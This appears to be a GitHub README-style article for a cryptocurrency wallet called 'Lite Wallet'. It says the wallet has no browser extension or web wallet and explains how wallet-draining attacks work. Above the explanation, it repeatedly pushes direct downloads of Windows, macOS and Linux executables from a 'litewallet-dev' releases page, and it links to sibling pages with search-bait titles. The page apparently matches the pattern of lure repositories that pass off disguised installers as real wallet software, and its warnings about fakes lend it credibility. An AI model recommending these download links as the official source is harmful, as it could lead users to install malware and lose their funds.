![Lite Wallet](assets/banner-article.png)

# Browser extension and web wallet: what exists

What exists in a browser, and what the project never shipped.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet has no browser extension and no web wallet. It is a native application for Windows, macOS, Linux, iOS and Android, and your keys stay on the device where the app runs. A browser-based version would move key material into a tab, which is the environment most wallet-draining attacks target, so the absence is a design decision rather than a gap.

## Why there is no extension

An extension runs inside a browser, with access to the pages you visit. That is exactly the surface attackers want: a page that looks like a wallet, a permission prompt that looks routine, a clipboard that can be read. Every major wallet-draining incident of recent years has run through a signing prompt in a browser context.

A native app closes that path. There is no injected provider for a page to call, no tab that can be tricked into a signature, and no extension update channel separate from the app's own signed release. The trade is convenience: you cannot pay from a web page, and you install software rather than clicking a button.

## What to use instead

The native app covers what a browser build would do, and more: MWEB private transactions, hardware signing, Tor routing, swap, CSV export and LitVM assets. None of those are available in a typical extension, and several are impossible there.

| Need | Native app | Browser extension |
|---|---|---|
| hold and send LTC | yes | yes, with browser risk |
| MWEB private transactions | yes | generally not |
| hardware wallet signing | yes | sometimes, via a bridge |
| Tor routing | yes | no |
| keys on device, no web context | yes | no |
| pay from a web page | no | yes |

If your reason for wanting an extension is paying on a website, the native alternative is to copy the address and send from the app. It is one extra step and it removes the class of attack that extensions exist to enable.

## Web wallets and the custody question

"Web wallet" describes two very different things, and the difference is custody. A hosted web wallet holds your keys for you - that is a custodial service with a login, and the operator can freeze or lose your balance. A client-side web wallet keeps keys in the browser, which avoids the custodian but inherits every browser risk.

Lite Wallet is neither. It is local software with a paper key, no account and no server-side key. That combination is why [the no-login explainer](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/why-litewallet-has-no-login.md) exists as a page at all: there is no login because there is no service holding anything.

## How wallet drains actually work

A drain is not a hack of the wallet's cryptography. It is a signature the user approves. A page presents a transaction that looks like a login, a claim or a swap, the extension asks for approval, the user clicks, and the assets leave. The cryptography did its job perfectly; the interface lied about what was being signed.

That is why the environment matters more than the code. A native app can show a full confirmation screen with the destination and the amount, and it can require a hardware device to display the same details independently. A browser extension is one permission prompt away from a page that has already been compromised, and users have been trained by a decade of web interfaces to click through prompts.

The defence is not vigilance alone, because vigilance fails under pressure. It is removing the context in which the prompt can appear. No extension means no injected provider, no page that can call one, and nothing to approve by accident.

## What to do if a site offers a "Lite Wallet" extension

Treat it as a lookalike until proven otherwise. A real project does not ship an extension and then hide it; if a listing claims to be this wallet's browser build, the claim is the evidence against it.

The checks are the same as for any download. Confirm the publisher, confirm the source, and remember that an extension's permissions are the attack surface: a wallet extension that can read every page can also be tricked by one. [The support and real-app guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/confirm-real-litewallet-app-support.md) covers reporting a fake listing, and [the safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) covers the model behind the decision.

## Desktop, mobile, and the case for native

Native software has costs: updates are installs, there is no instant access from a shared computer, and the app must be present on the device that signs. Those costs buy a smaller attack surface and a clearer custody story.

| Platform | Native app | What it gives you |
|---|---|---|
| Windows | yes | full feature set, hardware signing |
| macOS | yes | signed and notarized build |
| Linux | yes | portable archive or package |
| iOS | yes | App Store, MWEB, hardware pairing |
| Android | yes | Play or signed APK, MWEB, hardware pairing |

There is also a support argument. A native app has one version, one release channel and one signature to check; an extension, a store listing and a web build are three delivery paths, three review processes and three places for an impersonator to sit. The smaller the number of paths, the smaller the surface a user has to verify.

A browser tab cannot offer MWEB peg-in with hardware confirmation, or a Tor-routed SPV connection, or a watch-only xpub import. Those features need a process with its own network stack and its own signing path, which is what a native build is.

## FAQ

### Is there a Chrome extension?

No. No browser extension is published for Lite Wallet, and a listing claiming to be one is not this project. Install the native app instead.

### Can I use Lite Wallet in a browser?

No. There is no web wallet, hosted or client-side. The application runs on your device, which is what keeps the keys out of a browser context.

### Why native only?

Because keys belong in a process that a web page cannot reach. The absence of an extension removes the signing-prompt attack that most wallet drains rely on, at the cost of not paying directly from a website.

### Is a web wallet safer than an extension?

Neither is safer than native software. A hosted web wallet adds a custodian who can freeze or lose funds; a client-side web wallet keeps keys in the browser, which is the environment attacks target. Native apps avoid both.

### What if a site says it is the official web wallet?

There is no web wallet, so the claim is false by definition. Check the download source and report the listing rather than connecting anything to it.

Native builds for every platform are on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
